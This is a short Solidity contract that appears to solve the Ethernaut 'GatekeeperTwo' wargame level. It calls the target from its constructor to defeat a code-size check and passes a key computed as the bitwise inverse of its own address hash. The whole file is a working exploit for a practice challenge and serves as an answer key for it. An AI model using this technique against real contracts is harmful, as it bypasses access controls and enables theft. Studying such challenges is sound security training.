// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./level.sol";

contract Solution {
    GatekeeperTwo gatekeeper;

    constructor(address _addr) public {
        gatekeeper = GatekeeperTwo(_addr);
        bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(this)));
        gatekeeper.enter(gateKey);
    }
}
